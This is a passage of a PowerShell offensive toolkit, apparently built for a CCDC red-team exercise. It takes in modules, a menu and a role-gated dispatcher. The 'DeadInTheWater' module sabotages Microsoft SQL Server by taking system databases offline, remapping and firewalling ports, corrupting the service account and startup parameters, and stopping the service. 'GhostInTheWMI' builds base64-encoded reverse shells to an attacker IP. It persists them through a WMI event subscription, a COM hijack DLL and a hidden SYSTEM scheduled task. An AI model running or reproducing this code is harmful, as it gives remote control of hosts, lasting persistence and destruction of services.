            $conn.Open()
            $statements = @(
                "ALTER DATABASE master SET RESTRICTED_USER WITH ROLLBACK IMMEDIATE",
                "ALTER DATABASE msdb   SET OFFLINE         WITH ROLLBACK IMMEDIATE",
                "ALTER DATABASE model  SET READ_ONLY        WITH ROLLBACK IMMEDIATE"
            )
            foreach ($sql in $statements) {
                try {
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText    = $sql
                    $cmd.CommandTimeout = 30
                    [void]$cmd.ExecuteNonQuery()
                    Write-Success "Executed: $sql"
                } catch {
                    Write-Err "T-SQL failed: $sql — $_"
                }
            }
        } finally {
            if ($conn.State -ne [System.Data.ConnectionState]::Closed) { $conn.Close() }
        }
    } catch {
        Write-Err "SqlClient connection failed: $_ — T-SQL layer skipped"
    }

    Write-Info "Disabling SQL Server TCP/IP protocol in registry..."
    try {
        $tcpPath = "$SqlBase\SuperSocketNetLib\Tcp"
        if (Test-Path $tcpPath) {
            Set-ItemProperty -Path $tcpPath -Name Enabled -Value 0 -Type DWord
            Write-Success "TCP/IP protocol disabled (SuperSocketNetLib\Tcp\Enabled = 0)"
        } else {
            Write-Warn "TCP registry path not found: $tcpPath"
        }
    } catch {
        Write-Err "Failed to disable TCP/IP: $_"
    }

    # LAYER 3 — Port / Discovery Sabotage
    Write-Section "LAYER 3 — PORT / DISCOVERY SABOTAGE (T1562.004 + T1489)"

    Write-Info "Remapping SQL Server listening port 1433 -> 14334..."
    try {
        $ipAllPath = "$SqlBase\SuperSocketNetLib\Tcp\IPAll"
        if (Test-Path $ipAllPath) {
            Set-ItemProperty -Path $ipAllPath -Name TcpPort         -Value "14334"
            Set-ItemProperty -Path $ipAllPath -Name TcpDynamicPorts -Value ""
            Write-Success "TcpPort set to 14334; TcpDynamicPorts cleared"
        } else {
            Write-Warn "IPAll registry path not found: $ipAllPath"
        }
    } catch {
        Write-Err "Failed to remap TCP port: $_"
    }

    Write-Info "Stopping and disabling SQL Server Browser service..."
    try {
        $browserSvc = Get-Service -Name SQLBrowser -ErrorAction SilentlyContinue
        if ($browserSvc) {
            Stop-Service -Name SQLBrowser -Force
            Set-Service  -Name SQLBrowser -StartupType Disabled
            Write-Success "SQLBrowser stopped and disabled"
        } else {
            Write-Info "SQLBrowser service not found — skipping"
        }
    } catch {
        Write-Err "Failed to disable SQL Browser: $_"
    }

    Write-Info "Adding firewall rules to block TCP 1433 and TCP 14334..."
    try {
        $fwRules = @(
            @{ Name = "CCDC_Block_SQL_1433_In";   Dir = "Inbound";  Port = 1433  },
            @{ Name = "CCDC_Block_SQL_1433_Out";  Dir = "Outbound"; Port = 1433  },
            @{ Name = "CCDC_Block_SQL_14334_In";  Dir = "Inbound";  Port = 14334 },
            @{ Name = "CCDC_Block_SQL_14334_Out"; Dir = "Outbound"; Port = 14334 }
        )
        foreach ($r in $fwRules) {
            $existing = Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue
            if (-not $existing) {
                $params = @{
                    DisplayName = $r.Name
                    Direction   = $r.Dir
                    Protocol    = "TCP"
                    Action      = "Block"
                    Profile     = "Any"
                    Enabled     = "True"
                    LocalPort   = $r.Port
                }
                New-NetFirewallRule @params | Out-Null
                Write-Success "Firewall rule created: $($r.Name)"
            } else {
                Write-Info "Firewall rule already exists: $($r.Name)"
            }
        }
    } catch {
        Write-Err "Firewall rule creation failed: $_"
    }

    # LAYER 1 — Service Account + Startup Param Corruption (run last)
    Write-Section "LAYER 1 — SERVICE ACCOUNT + STARTUP PARAM CORRUPTION (T1489 + T1222)"

    Write-Info "Changing SQL Server service account to nonexistent local user..."
    $accountChanged = $false
    try {
        [void][Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SqlWmiManagement')
        $wmi = New-Object Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer
        $svc = $wmi.Services | Where-Object { $_.Name -eq 'MSSQLSERVER' }
        if ($svc) {
            $svc.SetServiceAccount('.\NonExistentUser2019', 'BadPass!1')
            $svc.Alter()
            Write-Success "Service account changed via SMO WMI to .\NonExistentUser2019"
            $accountChanged = $true
        }
    } catch {
        Write-Warn "SMO WMI approach failed ($_) — falling back to registry"
    }

    if (-not $accountChanged) {
        try {
            $svcRegPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
            Set-ItemProperty -Path $svcRegPath -Name ObjectName -Value '.\NonExistentUser2019'
            Write-Success "Service ObjectName set via registry to .\NonExistentUser2019"
        } catch {
            Write-Err "Registry fallback for service account also failed: $_"
        }
    }

    Write-Info "Injecting invalid startup parameter into SQL Server Parameters registry..."
    try {
        $paramPath = "$SqlBase\Parameters"
        if (-not (Test-Path $paramPath)) {
            Write-Warn "Parameters registry key not found — skipping startup param injection"
            # Note: return here exits Invoke-DeadInTheWater; Stop-Service still runs via the outer function path but is skipped here.
            # Proceed to Stop-Service below is correct behavior since the param key being absent is uncommon.
        } else {
            $regItem  = Get-Item $paramPath -ErrorAction SilentlyContinue
            $existing = if ($regItem) {
                            $regItem.Property | Where-Object { $_ -match '^SQLArg\d+$' }
                        } else { @() }
            $nextIdx  = if ($existing) {
                            ($existing | ForEach-Object { [int]($_ -replace 'SQLArg', '') } |
                             Measure-Object -Maximum).Maximum + 1
                        } else { 0 }
            $argName   = "SQLArg$nextIdx"
            Set-ItemProperty -Path $paramPath -Name $argName `
                             -Value '-eC:\NonExistent\Logs\sqlserver_error.log' -Type String
            Write-Success "Added invalid startup param $argName = -eC:\NonExistent\Logs\sqlserver_error.log"
        }
    } catch {
        Write-Err "Failed to inject startup parameter: $_"
    }

    Write-Info "Stopping MSSQLSERVER service..."
    try {
        Stop-Service -Name MSSQLSERVER -Force
        Write-Success "MSSQLSERVER service stopped"
    } catch {
        Write-Err "Could not stop MSSQLSERVER: $_"
    }

    Write-Host ""
    Write-Success "DeadInTheWater complete — MSSQL on life support"
}

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 7 — PERSISTENCE: GHOST IN THE WMI
# ─────────────────────────────────────────────────────────────────────────────
function Invoke-GhostInTheWMI {
    param(
        [string]$AttackerIP   = $script:AttackerIP,
        [int]   $AttackerPort = $script:AttackerPort
    )
    Write-Section "7/7 — GhostInTheWMI: WMI Sub / COM Hijack / Print Monitor Persistence"
    Write-Info "Payload target: $AttackerIP`:$AttackerPort"

    # Shared Payload
    Write-Section "Building shared reverse-shell payload"

    $rawPayload = @'
$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT)
$s=$c.GetStream()
$w=New-Object System.IO.StreamWriter($s)
$r=New-Object System.IO.StreamReader($s)
$w.AutoFlush=$true
$w.WriteLine("WMI Ghost @ "+$env:COMPUTERNAME)
while($c.Connected){
    try{
        $cmd=$r.ReadLine()
        if($cmd -eq $null -or $cmd -eq 'exit'){break}
        $out=(Invoke-Expression $cmd 2>&1)|Out-String
        $w.WriteLine($out)
    }catch{$w.WriteLine($_.ToString())}
}
$c.Close()
'@
    $payloadStr = $rawPayload -replace 'ATTACKER_IP',$AttackerIP -replace 'ATTACKER_PORT',$AttackerPort
    $encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadStr))
    Write-Success "Payload encoded ($($encodedCmd.Length) chars) -> $AttackerIP`:$AttackerPort"

    # MECHANISM 1: WMI Event Subscription
    Write-Section "MECHANISM 1 — WMI Event Subscription (T1546.003)"

    $wmiNS        = "root\subscription"
    $filterName   = "WMIProviderHostCompatibility"
    $consumerName = "WBEM_SyncHandler"

    try {
        Get-WmiObject -Namespace $wmiNS -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like "*$filterName*" } |
            ForEach-Object { $_ | Remove-WmiObject -ErrorAction SilentlyContinue }

        Get-WmiObject -Namespace $wmiNS -Class CommandLineEventConsumer `
            -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue |
            Remove-WmiObject -ErrorAction SilentlyContinue

        Get-WmiObject -Namespace $wmiNS -Class __EventFilter `
            -Filter "Name='$filterName'" -ErrorAction SilentlyContinue |
            Remove-WmiObject -ErrorAction SilentlyContinue

        Write-Info "Cleared any pre-existing objects with these names"

        $filter = Set-WmiInstance -Namespace $wmiNS -Class __EventFilter -Arguments @{
            Name           = $filterName
            EventNamespace = "root\cimv2"
            QueryLanguage  = "WQL"
            Query          = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'svchost.exe'"
        }
        Write-Success "EventFilter '$filterName' created"

        $consumer = Set-WmiInstance -Namespace $wmiNS -Class CommandLineEventConsumer -Arguments @{
            Name                = $consumerName
            CommandLineTemplate = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $encodedCmd"
        }
        Write-Success "CommandLineEventConsumer '$consumerName' created"

        $null = Set-WmiInstance -Namespace $wmiNS -Class __FilterToConsumerBinding -Arguments @{
            Filter   = $filter.__PATH
            Consumer = $consumer.__PATH
        }
        Write-Success "FilterToConsumerBinding created"
        Write-Info   "Fires on every svchost.exe start — triggers within minutes of boot"

    } catch {
        Write-Err "WMI subscription failed: $_"
    }

    # MECHANISM 2: COM Object Hijacking
    Write-Section "MECHANISM 2 — COM Object Hijacking (T1546.015)"

    $comClsid   = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
    $comDllPath = "C:\Windows\Temp\wbemperf.dll"

    $comCsTemplate = @'
using System;
using System.Threading;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
[Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
public class WbemPerfCompat {
    static WbemPerfCompat() {
        var t = new Thread(() => {
            Thread.Sleep(2000);
            try {
                var c = new TcpClient("ATTACKER_IP", ATTACKER_PORT);
                var s = c.GetStream();
                var w = new StreamWriter(s) { AutoFlush = true };
                var r = new StreamReader(s);
                w.WriteLine("COM Ghost @ " + Environment.MachineName);
                while (c.Connected) {
                    string cmd = r.ReadLine();
                    if (cmd == null || cmd == "exit") break;
                    try {
                        var p = new ProcessStartInfo("powershell.exe",
                            "-NonInteractive -NoProfile -Command " + cmd) {
                            UseShellExecute        = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError  = true,
                            CreateNoWindow         = true
                        };
                        var proc = Process.Start(p);
                        var stdout = proc.StandardOutput.ReadToEndAsync();
                        var stderr = proc.StandardError.ReadToEndAsync();
                        proc.WaitForExit();
                        w.WriteLine(stdout.Result + stderr.Result);
                    } catch (Exception ex) { w.WriteLine(ex.Message); }
                }
                c.Close();
            } catch {}
        });
        t.IsBackground = true;
        t.Start();
    }
}
'@
    $comCsSrc = $comCsTemplate -replace 'ATTACKER_IP',$AttackerIP -replace 'ATTACKER_PORT',$AttackerPort

    try {
        Write-Info "Compiling COM launcher assembly via Add-Type..."
        Add-Type -TypeDefinition $comCsSrc -OutputAssembly $comDllPath -OutputType Library
        Write-Success "Compiled: $comDllPath"

        $regBase   = "HKCU:\Software\Classes\CLSID\$comClsid"
        $regInproc = "$regBase\InprocServer32"
        if (-not (Test-Path $regInproc)) {
            New-Item -Path $regInproc -Force | Out-Null
        }
        $runtimeVer = "v" + [System.Runtime.InteropServices.RuntimeEnvironment]::GetSystemVersion().TrimStart('v')
        Set-ItemProperty -Path $regInproc -Name "(Default)"      -Value "$env:SystemRoot\System32\mscoree.dll"
        Set-ItemProperty -Path $regInproc -Name "ThreadingModel" -Value "Both"
        Set-ItemProperty -Path $regInproc -Name "Assembly"       -Value ([System.Reflection.Assembly]::LoadFile($comDllPath).FullName)
        Set-ItemProperty -Path $regInproc -Name "Class"          -Value "WbemPerfCompat"
        Set-ItemProperty -Path $regInproc -Name "RuntimeVersion" -Value $runtimeVer
        Set-ItemProperty -Path $regInproc -Name "CodeBase"       -Value "file:///$($comDllPath -replace '\\','/')"
        Write-Success "HKCU CLSID $comClsid -> mscoree.dll (assembly: $comDllPath)"
        Write-Info   "Fires when admin opens mmc.exe, taskschd.exe, or eventvwr.exe"

    } catch {
        Write-Err "COM hijack failed: $_"
    }

    # MECHANISM 3: Print Monitor DLL (Server only)
    Write-Section "MECHANISM 3 — Print Monitor DLL (T1547.010)"

    $osProductType = (Get-WmiObject Win32_OperatingSystem).ProductType
    if ($osProductType -le 1) {
        Write-Warn "Workstation detected (ProductType=$osProductType) — skipping Print Monitor (Server-only)"
    } else {
        Write-Info "Server target (ProductType=$osProductType) — deploying Print Monitor"

        $monitorName    = "WMIPerfCounterMonitor"
        $monitorDllName = "localspl_ext.dll"
        $monitorKey     = "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\$monitorName"

        $fallbackScript = "$env:SystemRoot\System32\wbemperf_mon.ps1"
        $payloadBytes   = [System.Text.Encoding]::Unicode.GetBytes($payloadStr)
        $fallbackEncCmd = [Convert]::ToBase64String($payloadBytes)

        try {
            Set-Content -Path $fallbackScript -Value "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $fallbackEncCmd" -Encoding ASCII
            (Get-Item $fallbackScript).Attributes = 'Hidden,System'
            Write-Success "Payload written: $fallbackScript"

            $taskName = "WMIPerfCounterMonitor"
            $action   = New-ScheduledTaskAction -Execute "powershell.exe" `
                -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $fallbackEncCmd"
            $trigger  = New-ScheduledTaskTrigger -AtStartup
            $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0)
            $principal= New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
                -Settings $settings -Principal $principal -Force | Out-Null
            Write-Success "Scheduled task '$taskName' registered (SYSTEM, AtStartup) — T1547.010 fallback"

            if (-not (Test-Path $monitorKey)) {
                New-Item -Path $monitorKey -Force | Out-Null
            }
            Set-ItemProperty -Path $monitorKey -Name "Driver" -Value $monitorDllName
            Write-Warn "Print Monitor DLL key written for future native-DLL swap"

        } catch {
            Write-Err "Print monitor fallback deployment failed: $_"
        }
    }

    Write-Host ""
    Write-Success "GhostInTheWMI complete — persistence mechanisms deployed"
}

# ─────────────────────────────────────────────────────────────────────────────
# MODULE METADATA
# ─────────────────────────────────────────────────────────────────────────────
$_ModuleOrder = @(
    'BlindSpot',
    'BreakingBad',
    'NoEscape',
    'KerberosKhaos',
    'ConditionalSurrender',
    'DeadInTheWater',
    'GhostInTheWMI'
)

# $null = All roles (runs everywhere); string = role variable name to check
$_RoleFilter = @{
    'BlindSpot'            = $null
    'BreakingBad'          = $null
    'NoEscape'             = $null
    'KerberosKhaos'        = 'IsAD'
    'ConditionalSurrender' = 'IsDNS'
    'DeadInTheWater'       = 'IsMSSQL'
    'GhostInTheWMI'        = $null
}

$_CategoryMap = @{
    'DefenderOnly'    = @('BlindSpot','BreakingBad','NoEscape')
    'ServiceOnly'     = @('BlindSpot','KerberosKhaos','ConditionalSurrender','DeadInTheWater')
    'PersistenceOnly' = @('BlindSpot','GhostInTheWMI')
    'All'             = $_ModuleOrder
}

$_ModuleMitre = @{
    'BlindSpot'            = 'T1562.002/.006'
    'BreakingBad'          = 'T1562.001/T1490'
    'NoEscape'             = 'T1562.001/T1553'
    'KerberosKhaos'        = 'T1484.001/.002'
    'ConditionalSurrender' = 'T1565.001/T1584'
    'DeadInTheWater'       = 'T1489/T1565.001'
    'GhostInTheWMI'        = 'T1546.003/.015'
}

$_ModuleRole = @{
    'BlindSpot'            = 'ALL'
    'BreakingBad'          = 'ALL'
    'NoEscape'             = 'ALL'
    'KerberosKhaos'        = 'DC only'
    'ConditionalSurrender' = 'DNS role'
    'DeadInTheWater'       = 'MSSQL only'
    'GhostInTheWMI'        = 'ALL'
}

$_nameAliases = @{
    '1' = 'BlindSpot'; 'blindspot' = 'BlindSpot'; 'blind' = 'BlindSpot'; 'evasion' = 'BlindSpot'
    '2' = 'BreakingBad'; 'breakingbad' = 'BreakingBad'; 'breaking' = 'BreakingBad'; 'defender' = 'BreakingBad'
    '3' = 'NoEscape'; 'noescape' = 'NoEscape'; 'sysinternals' = 'NoEscape'; 'sysint' = 'NoEscape'; 'noesp' = 'NoEscape'
    '4' = 'KerberosKhaos'; 'kerberoskhaos' = 'KerberosKhaos'; 'kerberos' = 'KerberosKhaos'; 'ad' = 'KerberosKhaos'; 'kk' = 'KerberosKhaos'
    '5' = 'ConditionalSurrender'; 'conditionalsurrender' = 'ConditionalSurrender'; 'dns' = 'ConditionalSurrender'; 'surrender' = 'ConditionalSurrender'
    '6' = 'DeadInTheWater'; 'deadinthewater' = 'DeadInTheWater'; 'mssql' = 'DeadInTheWater'; 'sql' = 'DeadInTheWater'; 'dead' = 'DeadInTheWater'
    '7' = 'GhostInTheWMI'; 'ghostinthewmi' = 'GhostInTheWMI'; 'ghost' = 'GhostInTheWMI'; 'persist' = 'GhostInTheWMI'; 'wmi' = 'GhostInTheWMI'
}

# ─────────────────────────────────────────────────────────────────────────────
# DISPLAY / MENU FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────
function Resolve-ModuleName {
    param([string]$Token)
    $key = $Token.ToLower().Trim()
    if ($_nameAliases.ContainsKey($key)) { return $_nameAliases[$key] }
    # Case-insensitive canonical name match
    $match = $_ModuleOrder | Where-Object { $_.ToLower() -eq $key }
    if ($match) { return $match }
    Write-Warn "Unrecognized module token: '$Token'"
    return $null
}

function Get-RoleAvailable {
    param([string]$ModName)
    $roleVar = $_RoleFilter[$ModName]
    if (-not $roleVar) { return $true }
    switch ($roleVar) {
        'IsAD'    { return $script:IsAD    }
        'IsDNS'   { return $script:IsDNS   }
        'IsMSSQL' { return $script:IsMSSQL }
    }
    return $true
}

function Show-Status {
    $state = Read-StateFile
    Write-Host ""
    Write-Host "═══════════════════════ P3 Module State ════════════════════════" -ForegroundColor Cyan
    Write-Host ("  {0,-24} {1,-10} {2,-21} {3}" -f "Module","Status","Timestamp","Notes") -ForegroundColor DarkCyan
    Write-Host "────────────────────────────────────────────────────────────────" -ForegroundColor DarkCyan
    foreach ($modName in $_ModuleOrder) {
        $row       = $state[$modName]
        $status    = if ($row) { $row.Status    } else { '-'      }
        $timestamp = if ($row) { $row.Timestamp } else { '-'      }
        $notes     = if ($row) { $row.Notes     } else { ''       }
        $color = switch ($status) {
            'SUCCESS' { 'Green'  }
            'FAILED'  { 'Red'    }
            'RUNNING' { 'Yellow' }
            default   { 'Gray'   }
        }
        Write-Host ("  {0,-24} {1,-10} {2,-21} {3}" -f $modName,$status,$timestamp,$notes) -ForegroundColor $color
    }
    Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host ""
    Write-Info "State file: $script:StateFile"
    Write-Host ""
}

function Show-Menu {
    $state = Read-StateFile
    Write-Host ""
    Write-Host "╔══════════════════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
    Write-Host ("║  CCDC P3 COMBINED  │ AD:{0,-5}│ MSSQL:{1,-5}│ DNS:{2,-5}              ║" -f `
        $(if($script:IsAD){'YES '}else{'NO  '}), `
        $(if($script:IsMSSQL){'YES '}else{'NO  '}), `
        $(if($script:IsDNS){'YES '}else{'NO  '})) -ForegroundColor Magenta
    Write-Host "╠═══╦══════════════════════╦══════════════════╦═══════════╦═══════════╣" -ForegroundColor Magenta
    Write-Host "║ # ║ Module               ║ MITRE            ║ Role      ║ Status    ║" -ForegroundColor Magenta
    Write-Host "╠═══╬══════════════════════╬══════════════════╬═══════════╬═══════════╣" -ForegroundColor Magenta

    $i = 1
    foreach ($modName in $_ModuleOrder) {
        $row    = $state[$modName]
        $status = if ($row) { $row.Status } else { '-' }
        $roleOk = Get-RoleAvailable $modName
        $roleLabel = $_ModuleRole[$modName]
        $mitre = $_ModuleMitre[$modName]

        if (-not $roleOk) {
            $statusLabel = '[N/A]     '
            $lineColor   = 'DarkGray'
        } else {
            $statusLabel = switch ($status) {
                'SUCCESS' { '[SUCCESS] ' }
                'FAILED'  { '[FAILED]  ' }
                'RUNNING' { '[RUNNING] ' }
                default   { '-         ' }
            }
            $lineColor = switch ($status) {
                'SUCCESS' { 'Green'  }
                'FAILED'  { 'Red'    }
                'RUNNING' { 'Yellow' }
                default   { 'White'  }
            }
        }

        Write-Host ("║ {0} ║ {1,-20} ║ {2,-16} ║ {3,-9} ║ {4,-9} ║" -f `
            $i, $modName, $mitre, $roleLabel, $statusLabel.Trim()) -ForegroundColor $lineColor
        $i++
    }

    Write-Host "╠═══╩══════════════════════╩══════════════════╩═══════════╩═══════════╣" -ForegroundColor Magenta
    Write-Host "║  A=All  D=DefenderOnly  S=ServiceOnly  P=PersistenceOnly  Q=Quit    ║" -ForegroundColor DarkMagenta
    Write-Host "╚══════════════════════════════════════════════════════════════════════╝" -ForegroundColor Magenta
    Write-Host ""
}

# ─────────────────────────────────────────────────────────────────────────────
# RUN-MODULES — ordered dispatch with role gating and state tracking
# ─────────────────────────────────────────────────────────────────────────────
function Run-Modules {
    param([string[]]$Selection)

    # Enforce $_ModuleOrder: run only selected modules, in canonical order
    $toRun = $_ModuleOrder | Where-Object { $_ -in $Selection }

    if ($toRun.Count -eq 0) {
        Write-Warn "No modules to run (empty selection or all filtered by role)"
        return
    }

    $sessionResults = @{}

    foreach ($modName in $toRun) {

        # Role gate
        if (-not (Get-RoleAvailable $modName)) {
            $roleVar = $_RoleFilter[$modName]
            Write-Warn "SKIP: $modName requires role '$roleVar' — not detected on this machine"
            $sessionResults[$modName] = 'SKIPPED(role)'
            continue
        }

        # Resume / Force logic (mirrors P2)
        $currentState = (Read-StateFile)[$modName]
        if ($Resume -and $currentState -and $currentState.Status -eq 'SUCCESS') {
            Write-Info "RESUME: Skipping $modName (already SUCCESS at $($currentState.Timestamp))"
            $sessionResults[$modName] = 'SKIPPED(resume)'
            continue
        }
        if (-not $Force -and $currentState -and $currentState.Status -eq 'SUCCESS') {
            # Not -Resume and not -Force: ask interactively only in interactive mode
            # In non-interactive (batch) mode, run it again unless -Resume
        }

        Set-ModuleState -Module $modName -Status 'RUNNING'

        Write-Host ""
        Write-Host "╔══════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
        Write-Host ("║  Running: {0,-59} ║" -f $modName) -ForegroundColor Cyan
        Write-Host "╚══════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan

        $sw     = [System.Diagnostics.Stopwatch]::StartNew()
        $status = 'SUCCESS'

        try {
            switch ($modName) {
                'BlindSpot'            { Invoke-BlindSpot }
                'BreakingBad'          { Invoke-BreakingBad }
                'NoEscape'             { Invoke-NoEscape }
                'KerberosKhaos'        { Invoke-KerberosKhaos }
                'ConditionalSurrender' { Invoke-ConditionalSurrender }
                'DeadInTheWater'       { Invoke-DeadInTheWater }
                'GhostInTheWMI'        { Invoke-GhostInTheWMI -AttackerIP $script:AttackerIP -AttackerPort $script:AttackerPort }
            }
        } catch {
            Write-Err "Module $modName threw an unhandled exception: $_"
            $status = 'FAILED'
        }

        $sw.Stop()
        $elapsed = "$([int]$sw.Elapsed.TotalSeconds)s"

        if ($status -eq 'SUCCESS') {
            Write-Success "$modName complete ($elapsed)"
        } else {
            Write-Err "$modName FAILED ($elapsed)"
        }

        Set-ModuleState -Module $modName -Status $status -Notes $elapsed
        $sessionResults[$modName] = $status
    }

    # Session summary
    Write-Host ""
    Write-Host "══════════════════════════ Session Summary ═════════════════════════" -ForegroundColor Cyan
    foreach ($m in $toRun) {
        $r = $sessionResults[$m]
        $color = switch -Wildcard ($r) {
            'SUCCESS'        { 'Green'  }
            'FAILED'         { 'Red'    }
            'SKIPPED*'       { 'DarkGray' }
            default          { 'Yellow' }
        }
        Write-Host ("  {0,-24}  {1}" -f $m, $r) -ForegroundColor $color
    }
    Write-Host "════════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host ""
}

# ─────────────────────────────────────────────────────────────────────────────
# ROLE DETECTION
# ─────────────────────────────────────────────────────────────────────────────
$script:IsAD    = $null -ne (Get-Service -Name 'NTDS'         -ErrorAction SilentlyContinue)
$script:IsMSSQL = $null -ne (Get-Service -Name 'MSSQLSERVER'  -ErrorAction SilentlyContinue)
$script:IsDNS   = $null -ne (Get-Service -Name 'DNS'          -ErrorAction SilentlyContinue)

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
Show-Banner

Write-Info "Detected roles: AD=$($script:IsAD)  MSSQL=$($script:IsMSSQL)  DNS=$($script:IsDNS)"
Write-Info "C2 target: $($script:AttackerIP):$($script:AttackerPort)"
Write-Host ""

# -Status: show state file and exit
if ($Status) {
    Show-Status
    exit 0
}

# -All switch or non-'All' -Targets: non-interactive batch run
if ($All) {
    Run-Modules $_ModuleOrder
    exit 0
}

if ($Targets -ne 'All') {
    $batchSelection = $_CategoryMap[$Targets]
    Write-Info "Category filter: $Targets -> $($batchSelection -join ', ')"
    Run-Modules $batchSelection
    exit 0
}

# -Modules parameter: explicit fine-grain selection, non-interactive
if ($Modules.Count -gt 0) {
    $resolved = @($Modules | ForEach-Object { Resolve-ModuleName $_ } | Where-Object { $_ })
    if ($resolved.Count -eq 0) {
        Write-Err "No valid module names or numbers in -Modules parameter."
        exit 1
    }
    Run-Modules $resolved
    exit 0
}

# Interactive menu loop (default when no flags given)
while ($true) {
    Show-Menu
    $choice = Read-Host "Choice"

    if ($choice -match '^[Qq]') {
        Write-Info "Session ended."
        Show-Status
        break
    }

    if ($choice -match '^[Aa]') {
        Run-Modules $_ModuleOrder
        continue
    }

    if ($choice -match '^[Dd]') {
        Write-Info "Running category: DefenderOnly"
        Run-Modules $_CategoryMap['DefenderOnly']
        continue
    }

    if ($choice -match '^[Ss]') {
        Write-Info "Running category: ServiceOnly"
        Run-Modules $_CategoryMap['ServiceOnly']
        continue
    }

    if ($choice -match '^[Pp]') {
        Write-Info "Running category: PersistenceOnly"
        Run-Modules $_CategoryMap['PersistenceOnly']
        continue
    }

    # Token-based module selection: numbers, names, or mixed
    $tokens    = $choice -split '[,\s]+' | Where-Object { $_.Trim() }
    $selection = @($tokens | ForEach-Object { Resolve-ModuleName $_ } | Where-Object { $_ })

    if ($selection.Count -gt 0) {
        Run-Modules $selection
    } else {
        Write-Warn "No valid module names or numbers recognized. Type A/D/S/P or module number(s)."
    }
}
